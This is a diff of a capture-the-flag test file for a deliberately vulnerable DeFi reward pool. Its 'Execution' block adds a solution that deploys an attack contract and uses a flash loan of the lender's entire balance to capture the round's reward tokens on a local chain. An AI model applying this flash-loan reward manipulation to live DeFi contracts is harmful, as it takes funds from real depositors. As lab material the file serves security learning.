@@ -36,7 +36,7 @@ describe('[Challenge] The rewarder', function () {
         expect(await accountingToken.hasAllRoles(rewarderPool.address, minterRole | snapshotRole | burnerRole)).to.be.true;
 
         // Alice, Bob, Charlie and David deposit tokens
-        let depositAmount = 100n * 10n ** 18n; 
+        let depositAmount = 100n * 10n ** 18n;
         for (let i = 0; i < users.length; i++) {
             await liquidityToken.transfer(users[i].address, depositAmount);
             await liquidityToken.connect(users[i]).approve(rewarderPool.address, depositAmount);
@@ -50,7 +50,7 @@ describe('[Challenge] The rewarder', function () {
 
         // Advance time 5 days so that depositors can get rewards
         await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
-        
+
         // Each depositor gets reward tokens
         let rewardsInRound = await rewarderPool.REWARDS();
         for (let i = 0; i < users.length; i++) {
@@ -63,13 +63,47 @@ describe('[Challenge] The rewarder', function () {
 
         // Player starts with zero DVT tokens in balance
         expect(await liquidityToken.balanceOf(player.address)).to.eq(0);
-        
+
         // Two rounds must have occurred so far
         expect(await rewarderPool.roundNumber()).to.be.eq(2);
     });
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let lenderBalanceDVT = await liquidityToken.balanceOf(flashLoanPool.address);
+        let beforePlayerDVT = await liquidityToken.balanceOf(player.address);
+        let beforePlayerRT = await rewardToken.balanceOf(player.address);
+        console.log("Lender DVT Balance: ", lenderBalanceDVT);
+        console.log("Player DVT Before: ", beforePlayerDVT);
+        console.log("Player RT  Before: ", beforePlayerRT);
+
+        // Advance time 5 days so that depositors can get rewards
+        console.log("Move time...");
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+        console.log("Deploying...");
+        const attackFactory = await ethers.getContractFactory('AttackRewarder', deployer);
+        const attack = await attackFactory.deploy(
+            rewarderPool.address,
+            liquidityToken.address,
+            player.address);
+
+
+        console.log("Attack...");
+        await attack.attack(flashLoanPool.address, lenderBalanceDVT);
+
+        console.log("Get Reward...");
+        await attack.take(rewardToken.address);
+
+        let afterPlayerDVT = await liquidityToken.balanceOf(player.address);
+        let afterPlayerRT = await rewardToken.balanceOf(player.address);
+        let afterAttackDVT = await liquidityToken.balanceOf(attack.address);
+        let afterAttackRT = await rewardToken.balanceOf(attack.address);
+
+        console.log("Player DVT After: ", afterPlayerDVT);
+        console.log("Attack DVT After: ", afterAttackDVT);
+        console.log("Player RT After:  ", afterPlayerRT);
+        console.log("Attack RT After:  ", afterAttackRT);
     });
 
     after(async function () {
@@ -79,6 +113,7 @@ describe('[Challenge] The rewarder', function () {
             await rewarderPool.roundNumber()
         ).to.be.eq(3);
 
+        console.log("Checking rewards for other users...");
         // Users should get neglegible rewards this round
         for (let i = 0; i < users.length; i++) {
             await rewarderPool.connect(users[i]).distributeRewards();
@@ -86,9 +121,11 @@ describe('[Challenge] The rewarder', function () {
             const delta = userRewards.sub((await rewarderPool.REWARDS()).div(users.length));
             expect(delta).to.be.lt(10n ** 16n)
         }
-        
+
         // Rewards must have been issued to the player account
+        console.log("Checking reward token supply...");
         expect(await rewardToken.totalSupply()).to.be.gt(await rewarderPool.REWARDS());
+
         const playerRewards = await rewardToken.balanceOf(player.address);
         expect(playerRewards).to.be.gt(0);
 
